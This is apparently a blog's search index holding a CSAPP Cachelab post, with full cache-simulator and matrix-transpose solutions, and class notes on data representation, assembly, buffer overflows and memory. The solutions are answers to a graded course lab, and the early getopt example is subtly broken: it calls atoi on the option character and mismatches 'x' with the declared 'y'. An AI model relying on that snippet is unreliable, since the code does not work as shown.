[{"categories":["csapp"],"content":"等待被翻译 非常抱歉，看起来这篇博文还没有被翻译成中文，请等待一段时间 ","date":"2023-02-19","objectID":"/zh-cn/posts/csapp/cachelab/:1:0","tags":null,"title":"Cachelab","uri":"/zh-cn/posts/csapp/cachelab/"},{"categories":["csapp"],"content":"Introduction In this lab, there are two parts: Write a small C program (about 200-300 lines) that simulates the behavior of a cache memory. Optimize a small matrix transpose function, with the goal of minimizing the number of cache misses. ","date":"2023-02-19","objectID":"/zh-cn/posts/csapp/cachelab/:2:0","tags":null,"title":"Cachelab","uri":"/zh-cn/posts/csapp/cachelab/"},{"categories":["csapp"],"content":"How to launch(Using docker) Source from Yansongsongsong Firstly using a docker: docker run -d -p 9912:22 --name datalab yansongsongsong/csapp:cachelab Then using vscode plugin remote ssh ssh root@127.0.0.1 -p 9912 password: THEPASSWORDYOUCREATED ","date":"2023-02-19","objectID":"/zh-cn/posts/csapp/cachelab/:3:0","tags":null,"title":"Cachelab","uri":"/zh-cn/posts/csapp/cachelab/"},{"categories":["csapp"],"content":"Part A: Writing a Cache Simulator In Part A we will write a cache simulator in csim.c that takes a valgrind memory trace as input, simulates the hit/miss behavior of a cache memory on this trace, and outputs the total number of hits, misses, and evictions. ","date":"2023-02-19","objectID":"/zh-cn/posts/csapp/cachelab/:4:0","tags":null,"title":"Cachelab","uri":"/zh-cn/posts/csapp/cachelab/"},{"categories":["csapp"],"content":"How to get command line options? int main(int argc, char **argv) { int opt, aflag = 0, nflag = 0; float xflag = 0.0; /* loop over arguments */ while (-1 != (opt = getopt(argc, argv, \"an:y:\"))) { /* determine which argument was found */ switch (opt) { case 'a': aflag = 1; break; case 'n': nflag = atoi(opt); break; case 'x': xflag = atof(opt); break; default: printf(\"unknown argument\"); break; } } return 0; } ","date":"2023-02-19","objectID":"/zh-cn/posts/csapp/cachelab/:4:1","tags":null,"title":"Cachelab","uri":"/zh-cn/posts/csapp/cachelab/"},{"categories":["csapp"],"content":"How to get content from files? FILE * fp; fp = fopen (\"traces/yi.trace\", \"r\"); if ( fp == NULL ) { // check here } char access_type; unsigned long address; int size; while(fscanf(fp, \" %c %lx,%d\", \u0026access_type, \u0026address, \u0026size) \u003e 0){ printf(\" %c %lx,%d\\n\", access_type, address, size); } fclose(fp); // always remember to free the memory you'v used ","date":"2023-02-19","objectID":"/zh-cn/posts/csapp/cachelab/:4:2","tags":null,"title":"Cachelab","uri":"/zh-cn/posts/csapp/cachelab/"},{"categories":["csapp"],"content":"How to realize LRU? The basic idea is to realize by queue, but there is no std library for C. So we use a lru_counter, when recently used, set counter to 0, add one for other block. When eviction, remove the block that has the biggest counter. // add 1 to lru_counter and find the biggest one // may do eviction(only happens when all of the lines are valid) for (int i = 0; i \u003c E; i++) { if (max_counter \u003c sets[s_index].lines[i].lru_counter) { eviction_index = i; max_counter = sets[s_index].lines[i].lru_counter; } sets[s_index].lines[i].lru_counter += 1; } if (need_evict) { // do your logic } ","date":"2023-02-19","objectID":"/zh-cn/posts/csapp/cachelab/:4:3","tags":null,"title":"Cachelab","uri":"/zh-cn/posts/csapp/cachelab/"},{"categories":["csapp"],"content":"The answer Carefully read all the instructions above, we now know how to realize the simulator. Here are my codes which can get all of the scores in test. #include \u003cgetopt.h\u003e #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #include \"cachelab.h\" typedef struct Line { int valid; int tag; // for lru eviction, remove the biggest counter, set 0 when used int lru_counter; } Line; typedef struct Set { Line *lines; } Set; /* global variables */ unsigned int s = 0, E = 0, b = 0; char access_log[20] = \"\"; Set *sets; int hit_count = 0, miss_count = 0, eviction_count = 0; void access_cache(unsigned long address) { unsigned int tag = address \u003e\u003e (s + b); int s_index = address \u003e\u003e b \u0026 ((1 \u003c\u003c s) - 1); // (1 \u003c\u003c s)-1 for % int eviction_index = -1, max_counter = -1; int need_evict = 1; // first loop to see whether there is a match, or cold start for (size_t i = 0; i \u003c E; i++) { if (sets[s_index].lines[i].valid) { // valid, compare tag if (sets[s_index].lines[i].tag == tag) { // hit hit_count += 1; sets[s_index].lines[i].lru_counter = 0; need_evict = 0; strcat(access_log, \"hit \"); break; } else { // tag mismatch, continue to next one continue; } } else { // cold start sets[s_index].lines[i].valid = 1; sets[s_index].lines[i].tag = tag; sets[s_index].lines[i].lru_counter = 0; strcat(access_log, \"miss \"); miss_count += 1; need_evict = 0; break; } } // second loop: add 1 to lru_counter and find the biggest one // may do eviction(only happens when all of the lines are valid) for (int i = 0; i \u003c E; i++) { if (max_counter \u003c sets[s_index].lines[i].lru_counter) { eviction_index = i; max_counter = sets[s_index].lines[i].lru_counter; } sets[s_index].lines[i].lru_counter += 1; } if (need_evict) { sets[s_index].lines[eviction_index].valid = 1; sets[s_index].lines[eviction_index].tag = tag; sets[s_index].lines[eviction_index].lru_counter = 0; strcat(access_log, \"miss eviction \"); miss_count += 1; eviction_count += 1; } } int main(int argc, char **argv) { /* P1: get user input*/ int opt, hflag = 0, vflag = 0; char *tflag; // no \":\" means an option, one \":\" means there must have one param // two \":\" means the option can have param const char *opt_string = \"hvs:E:b:t:\"; /* loop over arguments */ while ((opt = getopt(argc, argv, opt_string)) != -1) { /* determine which argument was found */ switch (opt) { case 'h': hflag = 1; break; case 'v': vflag = 1; break; case 's': s = atoi(optarg); break; case 'E': E = atoi(optarg); break; case 'b': b = atoi(optarg); break; case 't': tflag = optarg; break; default: printf(\"unknown argument\"); break; } } /*P2: dealing with user input, initialize the Set*/ if (hflag) { printf( \"Welcome using my cache lab simulatorm, friend! I am yewentao or Peter \" \"Ye in English, here are some command options which may help you.\\n \" \"-h: Optional help flag that prints usage info\\n \" \"-v: Optional verbose flag that displays trace info\\n \" \"-s \u003cs\u003e: Number of set index bits (S = 2^s is the number of sets)\\n \" \"-E \u003cE\u003e: Associativity (number of lines per set)\\n \" \"-b \u003cb\u003e: Number of block bits (B = 2^b is the block size)\\n \" \"-t \u003ctracefile\u003e: Name of the valgrind trace to replay\\n \"); return 0; } unsigned int S = 1 \u003c\u003c s; sets = (Set *)malloc(sizeof(Set) * S); for (int i = 0; i \u003c S; i++) { Line *lines = (Line *)malloc(sizeof(Line) * E); sets[i].lines = lines; } /*P3: scan the file and process each line*/ char access_type; unsigned long address; int size; FILE *fp; fp = fopen(tflag, \"r\"); if (fp == NULL) { printf(\"Fail to open file %s! Please check the path you input\", tflag); exit(0); } while (fscanf(fp, \" %c %lx,%d\", \u0026access_type, \u0026address, \u0026size) \u003e 0) { strcpy(access_log, \"\"); // clear the log string switch (access_type) { case 'L': access_cache(address); break; case 'M': access_cache(address); access_cache(address); break; case 'S': access_cache(address); break; default: break; } if (vflag \u0026\u0026 (access_type != 'I')) { printf(\"%c %lx,%d %s\\n\", access_type, address, size, access_log); } } /* P4: print the result*/ printSummary(hit_count, mis","date":"2023-02-19","objectID":"/zh-cn/posts/csapp/cachelab/:4:4","tags":null,"title":"Cachelab","uri":"/zh-cn/posts/csapp/cachelab/"},{"categories":["csapp"],"content":"Part B：Optimizing Matrix Transpose In Part B we will write a transpose function in trans.c that causes as few cache misses as possible. Note: We don’t recommend to spend too much time here, since it’s non-readable for your teammates in real project, and it is only useful for specific CPU and Cache. The param of cache is: s=5, b=5, E=1, so there are 32 sets, one line for each set and 32 bytes data in each line. ","date":"2023-02-19","objectID":"/zh-cn/posts/csapp/cachelab/:5:0","tags":null,"title":"Cachelab","uri":"/zh-cn/posts/csapp/cachelab/"},{"categories":["csapp"],"content":"32 * 32 Our cache can save 8 int(32 bytes) per line, so the common idea is to use 8 * 8 block to speed up. Note: we can do this because there are enough(32) sets in cache, which satisfies our needs, if there are only 16 sets(eg: s = 4), we can’t use this strategy. This is because if s=4, the first line in block A uses set0, the second line uses sets4… and the fourth line uses set0 again, which will cause conflicts. int i, j, m, n; for (i = 0; i \u003c N; i += 8) for (j = 0; j \u003c M; j += 8) for (m = i; m \u003c i + 8; ++m) for (n = j; n \u003c j + 8; ++n) { B[n][m] = A[m][n]; } ref code: 1183 misses, our code: 343 misses Is there any ways to make more use of cache? Yes! We can use local variable to directly save all of the elements in one line of A, to reduce conflict with B. (A and B share the cache, furthermore, if you calculate the cahce set index, the same array index in A and B share the same cache set line) int i, j, k, v1, v2, v3, v4, v5, v6, v7, v8; for (i = 0; i \u003c 32; i += 8) for (j = 0; j \u003c 32; j += 8) for (k = i; k \u003c (i + 8); ++k) { v1 = A[k][j]; v2 = A[k][j + 1]; v3 = A[k][j + 2]; v4 = A[k][j + 3]; v5 = A[k][j + 4]; v6 = A[k][j + 5]; v7 = A[k][j + 6]; v8 = A[k][j + 7]; B[j][k] = v1; B[j + 1][k] = v2; B[j + 2][k] = v3; B[j + 3][k] = v4; B[j + 4][k] = v5; B[j + 5][k] = v6; B[j + 6][k] = v7; B[j + 7][k] = v8; } ref code: 1183 misses, our code: 287 misses ","date":"2023-02-19","objectID":"/zh-cn/posts/csapp/cachelab/:5:1","tags":null,"title":"Cachelab","uri":"/zh-cn/posts/csapp/cachelab/"},{"categories":["csapp"],"content":"64 * 64 Since there are more data, the cache can’t hold block in 8*8. Why? the first line in block uses set0 for example, the second line uses set8… and the fourth line uses set0 again which will cause conflicts. So we make the block size smaller – 4*4. int i, j, k, v1, v2, v3, v4; for (i = 0; i \u003c M; i += 4) for(j = 0; j \u003c M; j += 4) for(k = i; k \u003c (i + 4); ++k) { v1 = A[k][j]; v2 = A[k][j+1]; v3 = A[k][j+2]; v4 = A[k][j+3]; B[j][k] = v1; B[j+1][k] = v2; B[j+2][k] = v3; B[j+3][k] = v4; } ref code: 4723 misses, our code: 1699 misses ","date":"2023-02-19","objectID":"/zh-cn/posts/csapp/cachelab/:5:2","tags":null,"title":"Cachelab","uri":"/zh-cn/posts/csapp/cachelab/"},{"categories":["csapp"],"content":"61 * 67 There are no specific rules for irregular matrix, simply test different block size and get the best result ref code: 4723 misses block_size = 4: 2425 misses block_size = 8: 2118 misses block_size = 16: 1992 misses block_size = 17: 1950 misses, block_size = 18: 1961 misses we choose the best one: int i, j, k, l; for (i = 0; i \u003c N; i += 17) { for (j = 0; j \u003c M; j += 17) { for (k = i; k \u003c i + 17 \u0026\u0026 k \u003c N; k++) { for (l = j; l \u003c j + 17 \u0026\u0026 l \u003c M; l++) { B[l][k] = A[k][l]; } } } } ","date":"2023-02-19","objectID":"/zh-cn/posts/csapp/cachelab/:5:3","tags":null,"title":"Cachelab","uri":"/zh-cn/posts/csapp/cachelab/"},{"categories":["csapp"],"content":"等待被翻译 非常抱歉，看起来这篇博文还没有被翻译成中文，请等待一段时间 ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:1:0","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"1. Overview ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:2:0","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Course theme theme：Abstraction is good but don’t forget reality ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:2:1","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Five realities ints are not integers；floats are not real To understand numbers in computer eg：x^2 \u003e= 0? for float：yes！ for int： 40000*40000=1600000000 yes! 50000*50000=?? not! eg：(x+y) + z = x+(y+z)? for int: yes! for于 float: (1e20+-1e20)+3.14 = 3.14； (1e20+(-1e20+3.14) = ?? you’ve got to know assembly learning about assembly memory matters memory management eg： there’s more to performance than asymptotic complexity eg： computers do more than execute programs IO/network ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:2:2","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"How the course fits into the CS/ECE curriculum build up the base for another courses. ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:2:3","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Course architecture programs and data L1(datalab): manipulating bits L2(bomblab): defuse a binary bomb L3(attacklab): injection attacks memory hierarchy L4(cachlab): build a cache simulator Exceptional control flow L5(tshlab): write a shell Virtual memory L6(malloclab): write a malloc package networking and concurrency L7(proxylab): write a web proxy ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:2:4","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"2. Bits,Bytes, and Integers ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:3:0","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Representing information as bits Everything is bits. Encoding Byte values. ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:3:1","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Bit-level manipulations Boolean Algebra Bit-level options in C: \u0026 | ~ ^ Logic Operations in C: \u0026\u0026 || ! Shift operations eg: ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:3:2","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Integers Unsigned and signed Numeric ranges signed: Tmax, Tmin unsigned: Umax, Umin Conversion, casting B2T, T2B B2U, U2B U2T, T2U Note: if both signed and unsigned in one expression, signed value implicitly cast to unsigned. eg: for(int i = n; i-sizeof(char); i--) {} // run forever! Corner case: normally -(-x) = x, but -Tmin(-32) != Tmax(31) (number is in 5 bits) Expanding, truncating expanding eg: 1010(-6) -\u003e 111010(-6) truncating eg: unsigned: 11011(27) -\u003e 1011(9) // mod 16 just remember: directly get the bytes then calculate it. Addition, negation, multiplication, shifting addition(negation) unsigned addition complement addition overflow multiplication unsigned multiplication signed multiplication eg: 5 * 5 = 25:0001-1001(-7). the result is -7 shift power-of-2 multiply with shift unsigned power-of-2 division with shift eg: 0011(3) /2 (»1) = 0001(1)–logical shift signed power-of-2 division: eg: 1101(-3) /2 (»1) = 1110(-2)–arithmetic shift extra: x -\u003e -x, just do !x+1 eg: -(1010) (-6) = 0101+0001 = 0110(6) ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:3:3","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Representations in memory, pointers and strings Byte-Oriented Memory Organization Machine words: 32bits, 64bits Word-Oriented Memory Organization Byte Ordering ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:3:4","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"3. Floating Point ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:4:0","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Fractional binary number eg: 5 + 3/4 = 101.11~2~ 2 + 7/8 = 10.111~2~ 1/3 = 0.0101[01]…~2~ ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:4:1","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"IEEE Floating Point f = (-1)^s^ M 2^E^ E = exp - Bias eg. exp has 8 bits, Normally 1\u003c=exp\u003c=254, bias = 127, so -126\u003c=E\u003c=127 why introducing the bias? for better comparison M = 1.0 + frac = 1.xxxx..x~2~ eg. minimum: xxxx..x = 0000..0, M = 1.0 eh. maximum: xxxx..x = 1111..1, M -\u003e 2.0 Take 15123 as an example: 15213 = 11101101101101~2~ = 1.1101101101101~2~ * 2^13^ M = 1.1101101101101~2~, frac = 1101101101101 + 0000000000 E = 13, bias = 127 -\u003e exp = 140 = 10001100~2~ so result: 0 10001100 1101101101101 0000000000 totally 32 bits For Denormalized Number: when exp = 00000..0 E = 1 - bias, M = frac (no leading 1) cases: frac = 0000.0: representing 0 (including -0 and +0) frac != 0000.0: closest to 0 For Denormalized Number: when exp = 1111..1 E = 1 - bias, M = frac (no leading 1) why for this? to represent more numbers, see the figure below cases: frac = 0000.0: representing inf frac != 0000.0: representing nan Examples together Note: when closing to 0, the numbers get denser ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:4:2","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Rounding, addition and multiplication Round strategy Towards 0 Round down(-inf) Round up(+inf) Nearest Even(default) eg: round to nearest 1/4 2 + 3/16 = 10.00110~2~ = 10.01~2~ (\u003e1/2 - UP) 2 + 7/8 = 10.11100~2~ = 11.00~2~ (exactly half) 2 + 5/8 = 10.10100~2~ = 10.10~2~ (exactly half) multiplication (-1)^s1^ M1 2^E1^ * (-1)^s2^ M2 2^E2^ s = s1 ^ s2 M = M1 * M2 E = E1 + E2 if after calculation, M \u003e 2 -\u003e shift M right, increment E If E out of range, overflow Round M to fit frac So now you understand why (1e20*1e20)*1e-20 = inf； (1e20*(1e-20*1e20) = 1e20 a\u003e=b \u0026 c\u003e=0 so a*c \u003e= b*c? Almost, Always consider inf and nan addition core: get binary points lined up (-1)^s1^ M1 2^E1^ + (-1)^s2^ M2 2^E2^ if after calculation, M \u003e 2 -\u003e shift M right, increment E M \u003c 1 -\u003e shift M left, decrement E If E out of range, overflow Round M to fit frac So now you understand why (1e20+-1e20)+3.14 = 3.14； (1e20+(-1e20+3.14) = ?? ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:4:3","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Floating point to C int -\u003e float: round 32 bits value to 23 bits frac double -\u003e int: round 52 bits frac to 32 bits 2/3 != 2/3.0 (floating point) double d \u003c 0 -\u003e d*2 \u003c0 (YES! even if overflow, it’s negative inf) ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:4:4","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"4. Machine Level Programing ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:5:0","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"C, assembly, machine code The process of compiling C: Compiler: GCC, to make assembly code: gcc -Og -S ... to make exec file(actually bytes of instructions) into assembly code: objdump -d ... ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:5:1","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Assembly Basics: Registers, operands, move Some specific registers: %rsp: stack pointer %rdi: first argument of function %rsi: second argument of function %rdx: third argument of function the relationships between different names of a register: |63..32|31..16|15-8|7-0| | AH |AL | | AX.....| |EAX............| |RAX...................| Memory access of moveq: Normally: (%rax) = Mem[rax] With offset: 8(%rax) = Mem[rax + 8] Generally: D(Rb, Ri, S) = Mem[Rb + S * Ri + D] ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:5:2","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Arithmetic \u0026 logical operations For example: leaq leaq 4(%rsi, %rsi, 2), %rdx: rdx = rsi + 2 * rsi + 4 ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:5:3","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Control: Condition codes %rip: instruction pointer Condition Codes CF(carry flag)–for unsigned overflow ZF(zero flag) SF(sign flag)–for signed OF(overflow flag)– for signed overflow cmpq: compare number (b-a) and set condition codes above testq: compare number (a\u0026b) but only set ZF and SF setX: set the low-order byte of destination to 0 or 1 based on the condition codes above example int gt (long x, long y) {return x\u003ey;} # compare x, y (%rsi is y, %rdi is x) cmpq %rsi, %rdi # Set when \u003e (if x-y \u003e 0, SF=1 and OF=1 or SF=0, OF=0) setg %al # move bytes to long, zero padding # Note this is %eax rather than %rax # this is because 32-bit instructions also set upper 32 bits to 0. movzbl %al, %eax ret ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:5:4","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Conditional branches jX: jump to different part of code depending on condition codes Note: Sometimes like Test? x+y:x-y in C, it’s efficient to calculate x+y and x-y both, then choose one using conditional move rather than using branches. Since branches are very disruptive to instruction flow through pipelines conditional move eg: cmovle %rdx %rax: if \u003c=, result = %rdx only use this when calculation is simple and is safe! ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:5:5","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Loops Using branches and control introduced above to realize do-while, while and for. ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:5:6","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Switch Statements Structure: How to form a jump table? Normally to make an array, and for some holes like x=0, x=4, let it go to the default part. Note: if x has a extremely large case like 10086, it can add a bias then make an array flow(like mapping to 7), too. Or sometimes it can be optimized to a decision tree–simple if else structure(in cases it’s hard to make an array flow) How to jump through table? # x compare 6 cmpq $6, %rdi # Use default: since we use **ja**(unsigned) here # jump if x \u003e 6 or x \u003c 0(unsigned negative is a large positive) ja .L8 # refer to (L4 + 8 * %rdi) address, get the value of it and then jump jmp *.L4(, %rdi, 8) ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:5:7","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Stack Structure ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:5:8","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Calling Conventions passing control: when calling a function, push the next instruction address to the stack, when ret, get the address back then jump to the address. passing data: save local data: Normally, use %rsp directly, sub some value at the beginning, then add it back before return. It’s OK to use movl to %esi, since the rest of 32 bits would be set to zero. This depends on the compiler Sometimes use %rbp, like allocating an array or memory buffer Caller Saved and Callee Saved Rules we need to obey, set in ABI(application binary interface) caller saved: the register can be overwritten–%rax, all of the arguments from %rdi to %r9, tmp %r10 and %r11 callee saved: the callee make sure not to affect any data used in the caller–%rbx, from %r12 to %r14, %rbp and %rsp recursive function example: ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:5:9","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Arrays ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:5:10","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Structures ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:5:11","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Floating Point float add(param passed in %xmm0, %xmm1): double add: ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:5:12","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Memory Layout stack for local variable (if more than 8MB, segmentation fault) heap memory is dynamically allocated for malloc、new … data is for static data Text/Shared Libraries for executable instructions(read only) ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:5:13","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Buffer Overflow If you input 23 characters in gets(), it’s ok (a default \\0 at the end of line) If you put 24 characters or more, it will gets to the return address and may cause a segmentation fault(depends on the address you jump to) code injection attacks Covering the return address, and use the instruction we input (see attacklab for more details) Ways to avoid: avoid overflow Vulnerabilities in Code: fgets instead of gets strncpy instead of strcpy don’t use scanf with %s system-level protections random stack offset: hard to predict the beginning of code non-executable code segments: only execute the read-only memory instructions stack Canaries save Canary in %rsp at first and then recheck it in the end(see bomblab for more details) Return-Oriented Programming attacks Use existing codes(gadgets) to attack, see attacklab for more details. ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:5:14","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"5. Program Optimization ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:6:0","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Generally Useful Optimizations Code motion/pre-computation strength reduction Core: replace costly operation with simpler one (eg. 16 * x -\u003e x «4) sharing of common sub-expressions eg: f = func(param), then use f directly, instead of a = func(param) + 2, b = func(param)*3 ... removing unnecessary procedure calls Why compiler doesn’t optimize this? Remember compiler always considers the procedure as black box. (It doesn’t know whether the procedure will change the pointer or global variable, etc.) Note: in python, len(str) is a O(1) func, so it doesn’t really matter. Remove memory accessing As you can see the b[i] has to read from memory each time It’s better using a local variable to cal the sum Why compiler can’t optimize it? Memory Aliasing ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:6:1","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Exploiting instruction-level parallelism CPE (cycles per element (OP like add) ) modern cpu design ideas of pipeline (p1 = a*b, dependency) Loop Unrolling For making use of multi-core processor for (i = 0; i \u003c limit; i += 2){ // x = x + array[i] + array[i+1]; x = x + (array[i] + array[i+1]); // can break the sequential dependency // another idea // x0 = x0 + array[i]; // x1 = x1 + array[i+1]; } Note: Not always useful, based on the processor SIMD operations Based on wide registers: Also called AVX instructions ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:6:2","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Dealing with Conditionals In order to making instructions run smoothly. We introduce the branch predict Simply guess the branch to go Begin executing instructions at predicted position It can recover when mis-prediction, causing huge performance cost ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:6:3","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"C Review Be careful when unsigned u \u003e -1: -1 is the biggest when unsigned Initialize array with exact value Remember there is a \\0 at the end of string When sizeof(xx), make sure xx is not a pointer Remember to free after malloc Don’t return a pointer pointing at a local variable int *a; when a + 1, address of a actually add sizeof(int) * 1 = 4 ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:6:4","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"6. Memory ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:7:0","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Storage technologies and trends Random-Access Memory(RAM) SRAM(static, expensive, cache, volatile: lose information when power off) DRAM(dynamic, main memory, volatile) Read-only memory(ROM) nonvolatile: keep information when power off BIOS, firmware programs saved in ROM Bus(collection of parallel wires) structure Disk capacity: 512 bytes/sector * 300 sectors/track(on average) * 20000 tracks/surface * 2 surfaces/platter * 5 platters/ disk = 30.72GB disk access: Normally disk access time = seek time(4~9ms) + rotation(2~5ms) + transfer(0.02ms), much slower than RAM(ns) Bus structure expand Note: this is not the modern design, which use point to point connection instead of a public wire interrupt: cpu never waits for disk, when data is carried from disk to memory, it will notify cpu and let cpu continue to work on that data. solid state disk(ssd): much faster than normal disk cpu-memory-gap ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:7:1","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Locality of reference principle programs tend to use data and instructions with addresses near or equal to those they have used recently ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:7:2","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Caching in memory hierarchy ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:7:3","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Cache memory organization and operation general cache organization cache_size = S * E * B bytes cache read locate set check all lines in set to match tag tag matches and valid is true: hit locate data by offset Note: if not match, old line is evicted and replaced simple example When there comes a 8 [1000], it will miss, and set 0 is evicted And when there comes a 0 [0000], it will miss again However, if we change the bits of lines, it will change. block size: hyperparameter of memory system if too small: locality principle(easily use nearby bytes) is not used if 